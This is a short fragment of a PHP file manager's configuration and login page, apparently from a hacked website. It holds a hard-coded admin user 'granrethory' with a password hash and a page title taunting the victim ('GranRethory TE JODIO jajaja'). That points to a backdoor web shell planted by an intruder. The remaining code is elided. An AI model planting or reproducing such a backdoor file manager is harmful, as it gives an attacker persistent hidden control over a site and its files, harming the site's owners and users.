...
$auth_users = array(
    'granrethory' => '$2y$10$46gktQTh0sH/nqOYVirg0uU7A5FLl4ee.bO4cZpX8/uBZVAp7UX3a', //admin
);
            ...
            <div class="container h-100">
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="brand">
                            <img src="" alt="H3K File Manager">
                        </div>
                        <div class="text-center">
                            <h1 class="card-title">GranRethory TE JODIO jajaja</h1>
                        </div>
                        <div class="card fat">
                            <div class="card-body">
